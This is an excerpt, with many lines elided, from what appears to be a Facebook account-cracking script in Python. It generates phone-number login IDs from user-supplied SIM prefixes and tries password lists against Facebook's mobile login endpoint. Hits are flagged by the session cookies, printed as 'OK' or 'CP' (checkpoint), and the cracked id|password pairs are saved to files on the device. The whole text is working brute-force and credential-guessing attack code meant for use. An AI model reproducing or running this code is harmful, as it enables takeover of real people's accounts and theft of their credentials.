...
def ffb(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			TORUN=session.cookies.get_dict().keys()
			if "c_user" in TORUN:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m[TORUN-OK] %s | %s'%(ids,pas))
				
				open('/sdcard/TORUN-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TORUN:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[SHAHBAZ-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/TORUN-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def random_number2():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :017,018,016,019.ETC')
	linex()
	kode = input('[+]\8801;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
...
def random_number3():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :019,016,018,019.ETC')
	linex()
	kode = input('[+]\880[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[TORUN-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[TORUN-OK] '+cid+' | '+ps+'\33[0;97m')
